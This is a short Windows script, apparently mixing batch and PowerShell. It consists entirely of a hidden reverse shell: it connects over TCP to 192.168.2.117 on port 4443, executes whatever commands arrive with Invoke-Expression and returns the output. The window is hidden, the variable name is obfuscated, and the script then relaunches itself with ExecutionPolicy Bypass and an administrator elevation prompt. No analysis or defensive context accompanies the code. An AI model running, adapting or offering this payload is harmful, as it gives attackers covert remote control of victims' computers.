@echo off

if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        Start-Process $PSHOME\powershell.exe -ArgumentList {$e5e36b75aed34dea8e833c640fdb76a1 = New-Object Net.Sockets.TCPClient('192.168.2.117', 4443);$NetworkStream = $e5e36b75aed34dea8e833c640fdb76a1.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$e5e36b75aed34dea8e833c640fdb76a1.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()} -WindowStyle Hidden
        $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
        Exit
    }

